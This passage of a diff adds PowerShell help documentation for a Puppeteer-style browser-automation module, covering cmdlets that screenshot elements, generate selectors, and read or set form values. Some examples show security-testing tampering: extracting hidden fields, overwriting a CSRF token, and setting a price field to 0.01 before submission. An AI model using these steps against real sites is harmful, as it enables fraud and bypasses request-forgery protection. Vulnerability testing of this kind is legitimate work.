+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupElementScreenshot -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupElementScreenshot</command:name>
+      <maml:description>
+        <maml:para>Takes a screenshot of a specific element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Captures just the specified element as an image, excluding the rest of the page. Useful for documenting specific UI components.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Screenshot a chart</maml:title>
+        <dev:code>$chart = Find-PupElements -Page $page -Selector "#revenue-chart" -First
+Get-PupElementScreenshot -Element $chart -FilePath "chart.png"</dev:code>
+        <dev:remarks>
+          <maml:para>Captures just the chart element.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Document error state</maml:title>
+        <dev:code>$error = Find-PupElements -Page $page -Selector ".error-panel" -First
+$bytes = Get-PupElementScreenshot -Element $error -PassThru
+[System.IO.File]::WriteAllBytes("error-evidence.png", $bytes)</dev:code>
+        <dev:remarks>
+          <maml:para>Screenshots an error message for evidence.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupElementSelector -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupElementSelector</command:name>
+      <maml:description>
+        <maml:para>Gets a unique CSS selector for an element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Generates a CSS selector that uniquely identifies the element. Useful for debugging and creating reproducible test scripts.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Get selector for clicked element</maml:title>
+        <dev:code>$el = Find-PupElements -Page $page -Selector "button" | Select-Object -First 1
+Get-PupElementSelector -Element $el</dev:code>
+        <dev:remarks>
+          <maml:para>Returns a unique selector for the element.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Get-PupElementValue -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Get-PupElementValue</command:name>
+      <maml:description>
+        <maml:para>Gets the value property of a form element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Returns the current value of an input, textarea, or select element. Different from text content - this is the form field value.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Get input value</maml:title>
+        <dev:code>$input = Find-PupElements -Page $page -Selector "#username" -First
+Get-PupElementValue -Element $input</dev:code>
+        <dev:remarks>
+          <maml:para>Gets the current value in the username field.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Extract hidden field values</maml:title>
+        <dev:code>$hiddenInputs = Find-PupElements -Page $page -Selector "input[type=hidden]"
+$hiddenInputs | ForEach-Object {
+    $name = Get-PupElementAttribute -Element $_ -Name "name"
+    $value = Get-PupElementValue -Element $_
+    "$name = $value"
+}</dev:code>
+        <dev:remarks>
+          <maml:para>Extracts all hidden form field values.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+  <!-- Set-PupElementValue -->
+  <command:command xmlns:maml="http://schemas.microsoft.com/maml/2004/10" xmlns:command="http://schemas.microsoft.com/maml/dev/command/2004/10" xmlns:dev="http://schemas.microsoft.com/maml/dev/2004/10">
+    <command:details>
+      <command:name>Set-PupElementValue</command:name>
+      <maml:description>
+        <maml:para>Sets the value property of a form element.</maml:para>
+      </maml:description>
+    </command:details>
+    <maml:description>
+      <maml:para>Directly sets the value property of an input element. Faster than typing but doesn't trigger keyboard events.</maml:para>
+    </maml:description>
+    <command:examples>
+      <command:example>
+        <maml:title>Example 1: Set input value</maml:title>
+        <dev:code>$input = Find-PupElements -Page $page -Selector "#csrf-token" -First
+Set-PupElementValue -Element $input -Value "manipulated_token"</dev:code>
+        <dev:remarks>
+          <maml:para>Directly sets the value of a hidden input.</maml:para>
+        </dev:remarks>
+      </command:example>
+      <command:example>
+        <maml:title>Example 2: Modify hidden fields before submit</maml:title>
+        <dev:code>$priceField = Find-PupElements -Page $page -Selector "input[name=price]" -First
+Set-PupElementValue -Element $priceField -Value "0.01"
+$form = Find-PupElements -Page $page -Selector "form" -First
+# Submit to test price manipulation</dev:code>
+        <dev:remarks>
+          <maml:para>Tests for price manipulation vulnerabilities.</maml:para>
+        </dev:remarks>
+      </command:example>
+    </command:examples>
+  </command:command>
+
+</helpItems>
